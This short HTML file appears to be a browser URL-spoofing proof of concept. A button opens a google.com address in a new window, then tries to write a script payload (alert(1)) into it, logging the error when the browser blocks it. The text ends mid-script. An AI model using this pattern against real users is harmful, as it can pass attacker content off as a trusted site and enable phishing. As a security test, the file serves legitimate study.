<!DOCTYPE html>
<html>
<body>
  <button onclick="spoof()">Click to spoof</button>

  <script>
    function spoof() {
      let win = window.open("https://www.google.com/gen_204", "_blank");

      let payload = `
          <script>
          alert(1);
          <\/script>
      `;

      setTimeout(() => {
        try {
          win.document.write(payload);
          win.document.close();
        } catch (e) {
          console.warn("Blocked by browser protections:", e);
        }
      }, 200);
    }
